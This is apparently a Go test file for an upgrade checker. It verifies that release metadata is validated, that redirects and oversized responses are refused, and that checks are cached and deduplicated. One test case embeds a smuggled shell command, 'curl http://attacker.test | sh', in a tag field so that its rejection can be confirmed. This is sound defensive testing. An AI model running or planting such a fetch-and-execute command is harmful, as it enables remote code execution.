package upgrade

import (
	"context"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"
)

func TestSource_Latest(t *testing.T) {
	t.Parallel()

	//nolint:govet // Keep table fields grouped by request, then expectation.
	tests := []struct {
		name       string
		status     int
		body       string
		wantTag    string
		wantErr    bool
		wantReason string
	}{
		{
			name:    "published stable release",
			status:  http.StatusOK,
			body:    `{"tag_name":"v0.1.4","draft":false,"prerelease":false,"name":"v0.1.4","assets":[]}`,
			wantTag: "v0.1.4",
		},
		{
			name:    "unknown fields are ignored",
			status:  http.StatusOK,
			body:    `{"tag_name":"v2.0.0","html_url":"https://example.test","body":"notes","author":{"login":"x"}}`,
			wantTag: "v2.0.0",
		},
		{
			name:       "a draft is never a release",
			status:     http.StatusOK,
			body:       `{"tag_name":"v0.2.0","draft":true,"prerelease":false}`,
			wantErr:    true,
			wantReason: "draft",
		},
		{
			name:       "a prerelease flag is never a release",
			status:     http.StatusOK,
			body:       `{"tag_name":"v0.2.0","draft":false,"prerelease":true}`,
			wantErr:    true,
			wantReason: "prerelease",
		},
		{
			name:       "a prerelease tag is refused even without the flag",
			status:     http.StatusOK,
			body:       `{"tag_name":"v0.2.0-rc.1","draft":false,"prerelease":false}`,
			wantErr:    true,
			wantReason: "prerelease",
		},
		{
			name:    "a tag without the v prefix is malformed metadata",
			status:  http.StatusOK,
			body:    `{"tag_name":"0.2.0"}`,
			wantErr: true,
		},
		{
			name:    "a tag that is a path is malformed metadata",
			status:  http.StatusOK,
			body:    `{"tag_name":"refs/tags/v0.2.0"}`,
			wantErr: true,
		},
		{
			name:    "a tag carrying a shell fragment is malformed metadata",
			status:  http.StatusOK,
			body:    `{"tag_name":"v0.2.0; curl http://attacker.test | sh"}`,
			wantErr: true,
		},
		{
			name:    "a missing tag is malformed metadata",
			status:  http.StatusOK,
			body:    `{"draft":false}`,
			wantErr: true,
		},
		{
			name:    "an empty body is malformed metadata",
			status:  http.StatusOK,
			body:    ``,
			wantErr: true,
		},
		{
			name:    "html instead of json is malformed metadata",
			status:  http.StatusOK,
			body:    `<html><body>rate limited</body></html>`,
			wantErr: true,
		},
		{
			name:    "a server error is not an answer",
			status:  http.StatusInternalServerError,
			body:    `{"tag_name":"v9.9.9"}`,
			wantErr: true,
		},
		{
			name:    "a rate limit response is not an answer",
			status:  http.StatusForbidden,
			body:    `{"message":"API rate limit exceeded"}`,
			wantErr: true,
		},
		{
			name:    "a not found response is not an answer",
			status:  http.StatusNotFound,
			body:    `{"message":"Not Found"}`,
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				if got := r.Header.Get("Authorization"); got != "" {
					t.Errorf("release check sent an Authorization header %q; the check must be credential-free", got)
				}
				if got := r.Header.Get("Cookie"); got != "" {
					t.Errorf("release check sent a Cookie header %q; the check must be credential-free", got)
				}
				w.WriteHeader(tt.status)
				_, _ = w.Write([]byte(tt.body))
			}))
			defer server.Close()

			source := &Source{URL: server.URL, HTTPClient: newCheckClient()}
			latest, err := source.Latest(context.Background())

			if tt.wantErr {
				if err == nil {
					t.Fatalf("Latest() = %s, want an error", latest)
				}
				if !errors.Is(err, ErrReleaseUnavailable) {
					t.Fatalf("Latest() error = %v, want ErrReleaseUnavailable", err)
				}
				if tt.wantReason != "" && !strings.Contains(err.Error(), tt.wantReason) {
					t.Fatalf("Latest() error = %v, want it to mention %q", err, tt.wantReason)
				}
				return
			}
			if err != nil {
				t.Fatalf("Latest() error = %v", err)
			}
			if latest.Tag() != tt.wantTag {
				t.Fatalf("Latest() = %q, want %q", latest.Tag(), tt.wantTag)
			}
			if !latest.IsStable() {
				t.Fatalf("Latest() = %s, want a stable version", latest)
			}
		})
	}
}

func TestSource_Latest_RefusesARedirect(t *testing.T) {
	t.Parallel()

	elsewhere := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write([]byte(`{"tag_name":"v9.9.9"}`))
	}))
	defer elsewhere.Close()

	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, elsewhere.URL, http.StatusFound)
	}))
	defer server.Close()

	source := &Source{URL: server.URL, HTTPClient: newCheckClient()}
	if _, err := source.Latest(context.Background()); err == nil {
		t.Fatal("Latest() followed a redirect; the release metadata read must not be steered elsewhere")
	}
}

func TestSource_Latest_BoundsTheResponseBody(t *testing.T) {
	t.Parallel()

	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		// A valid tag buried behind more bytes than the bound allows must not be
		// read: the read has to stop, not keep going until the JSON parses.
		_, _ = w.Write([]byte(`{"padding":"` + strings.Repeat("a", maxReleaseMetadataBytes+1024) + `","tag_name":"v9.9.9"}`))
	}))
	defer server.Close()

	source := &Source{URL: server.URL, HTTPClient: newCheckClient()}
	if _, err := source.Latest(context.Background()); err == nil {
		t.Fatal("Latest() accepted a response past the size bound")
	}
}

func TestSource_Latest_HonoursACancelledContext(t *testing.T) {
	t.Parallel()

	release := make(chan struct{})
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		<-release
		_, _ = w.Write([]byte(`{"tag_name":"v9.9.9"}`))
	}))
	defer server.Close()
	defer close(release)

	ctx, cancel := context.WithCancel(context.Background())
	cancel()

	source := &Source{URL: server.URL, HTTPClient: newCheckClient()}
	if _, err := source.Latest(ctx); err == nil {
		t.Fatal("Latest() ignored a cancelled context")
	}
}

// fakeSource counts calls so cache behaviour can be asserted without a network.
//
//nolint:govet // Keep fields grouped by what they control, not by width.
type fakeSource struct {
	err     error
	started chan struct{}
	block   chan struct{}
	latest  Version
	calls   atomic.Int64
}

func (f *fakeSource) Latest(context.Context) (Version, error) {
	f.calls.Add(1)
	if f.started != nil {
		f.started <- struct{}{}
	}
	if f.block != nil {
		<-f.block
	}
	return f.latest, f.err
}

func newFakeSource(t *testing.T, tag string) *fakeSource {
	t.Helper()
	return &fakeSource{latest: mustParseVersion(t, tag)}
}

// testClock is a manually advanced clock. Tests must not sleep, so cache
// expiry is driven by moving this forward.
//
//nolint:govet // Keep the mutex next to the field it guards.
type testClock struct {
	mu  sync.Mutex
	now time.Time
}

func newTestClock() *testClock {
	return &testClock{now: time.Date(2026, 8, 28, 12, 0, 0, 0, time.UTC)}
}

func (c *testClock) Now() time.Time {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.now
}

func (c *testClock) Advance(d time.Duration) {
	c.mu.Lock()
	c.now = c.now.Add(d)
	c.mu.Unlock()
}

func TestChecker_CachesASuccessForTheTTL(t *testing.T) {
	t.Parallel()

	source := newFakeSource(t, "v0.1.4")
	clock := newTestClock()
	checker := newChecker(source, clock.Now)

	if snapshot := checker.Snapshot(); snapshot.Latest != nil || !snapshot.CheckedAt.IsZero() {
		t.Fatalf("Snapshot() before any check = %+v, want an empty snapshot", snapshot)
	}

	first := checker.Refresh(context.Background())
	if first.Latest == nil || first.Latest.Tag() != "v0.1.4" {
		t.Fatalf("Refresh() = %+v, want v0.1.4", first)
	}
	if first.CheckedAt != clock.Now() {
		t.Fatalf("Refresh().CheckedAt = %s, want %s", first.CheckedAt, clock.Now())
	}

	clock.Advance(CheckTTL - time.Second)
	checker.Refresh(context.Background())
	if got := source.calls.Load(); got != 1 {
		t.Fatalf("release source called %d times inside the TTL, want 1", got)
	}

	clock.Advance(2 * time.Second)
	checker.Refresh(context.Background())
	if got := source.calls.Load(); got != 2 {
		t.Fatalf("release source called %d times after the TTL expired, want 2", got)
	}
}

func TestChecker_BoundsRetriesAfterAFailure(t *testing.T) {
	t.Parallel()

	source := &fakeSource{err: fmt.Errorf("%w: boom", ErrReleaseUnavailable)}
	clock := newTestClock()
	checker := newChecker(source, clock.Now)

	snapshot := checker.Refresh(context.Background())
	if snapshot.Err == "" {
		t.Fatal("Refresh() after a failure recorded no error; a failed check must be reported, not silently treated as up to date")
	}
	if snapshot.Latest != nil {
		t.Fatalf("Refresh() = %+v, want no release after a failure", snapshot)
	}
	if !snapshot.CheckedAt.IsZero() {
		t.Fatal("Refresh() stamped CheckedAt on a failed check")
	}

	clock.Advance(CheckRetryInterval - time.Second)
	checker.Refresh(context.Background())
	if got := source.calls.Load(); got != 1 {
		t.Fatalf("release source called %d times inside the retry interval, want 1: a dashboard reload must not become a request loop", got)
	}

	clock.Advance(2 * time.Second)
	checker.Refresh(context.Background())
	if got := source.calls.Load(); got != 2 {
		t.Fatalf("release source called %d times after the retry interval, want 2", got)
	}
}

func TestChecker_KeepsALastKnownReleaseWhenAConsecutiveCheckFails(t *testing.T) {
	t.Parallel()

	source := newFakeSource(t, "v0.1.4")
	clock := newTestClock()
	checker := newChecker(source, clock.Now)

	checker.Refresh(context.Background())
	source.err = errors.New("release source is down")
	clock.Advance(CheckTTL + time.Second)

	snapshot := checker.Refresh(context.Background())
	if snapshot.Latest == nil || snapshot.Latest.Tag() != "v0.1.4" {
		t.Fatalf("Refresh() = %+v, want the last known release to be kept", snapshot)
	}
	if snapshot.Err == "" {
		t.Fatal("Refresh() hid the failure; a stale answer must be reported alongside the failure")
	}
}

func TestChecker_DoesNotStartASecondCheckWhileOneIsRunning(t *testing.T) {
	t.Parallel()

	source := newFakeSource(t, "v0.1.4")
	source.started = make(chan struct{}, 1)
	source.block = make(chan struct{})

	checker := newChecker(source, newTestClock().Now)

	checker.EnsureFresh(context.Background())
	<-source.started

	// More background triggers while one check is in flight must not add
	// requests to the release source.
	checker.EnsureFresh(context.Background())
	checker.EnsureFresh(context.Background())

	if got := source.calls.Load(); got != 1 {
		t.Fatalf("release source called %d times, want 1: checks must not overlap", got)
	}

	close(source.block)
}

// A dashboard status request starts a background check. An upgrade started
// while that check is in flight has to wait for its answer, not be told the
// release source is unavailable — that refusal would name a reason that is not
// true, and would block an upgrade that is actually available.
func TestChecker_RefreshWaitsForACheckAlreadyRunning(t *testing.T) {
	t.Parallel()

	source := newFakeSource(t, "v0.1.4")
	source.started = make(chan struct{}, 1)
	source.block = make(chan struct{})

	checker := newChecker(source, newTestClock().Now)

	// Stands in for a status request that found the cache cold.
	checker.EnsureFresh(context.Background())
	<-source.started

	refreshed := make(chan CheckSnapshot, 1)
	go func() {
		refreshed <- checker.Refresh(context.Background())
	}()

	close(source.block)
	snapshot := <-refreshed

	if snapshot.Err != "" {
		t.Fatalf("Refresh() reported %q while another check was running; it must wait for that check", snapshot.Err)
	}
	if snapshot.Latest == nil || snapshot.Latest.Tag() != "v0.1.4" {
		t.Fatalf("Refresh() = %+v, want the in-flight check's answer", snapshot)
	}
	if got := source.calls.Load(); got != 1 {
		t.Fatalf("release source called %d times, want 1: the waiting caller must reuse the running check", got)
	}
}

func TestChecker_EnsureFreshDoesNotBlockOnTheSource(t *testing.T) {
	t.Parallel()

	source := newFakeSource(t, "v0.1.4")
	source.started = make(chan struct{}, 1)
	source.block = make(chan struct{})
	checker := newChecker(source, newTestClock().Now)

	checker.EnsureFresh(context.Background())
	<-source.started

	// The snapshot is still empty while the background check runs, and asking
	// for it did not wait on the source.
	if snapshot := checker.Snapshot(); snapshot.Latest != nil {
		t.Fatalf("Snapshot() = %+v, want an empty snapshot while the check is still running", snapshot)
	}

	close(source.block)
}
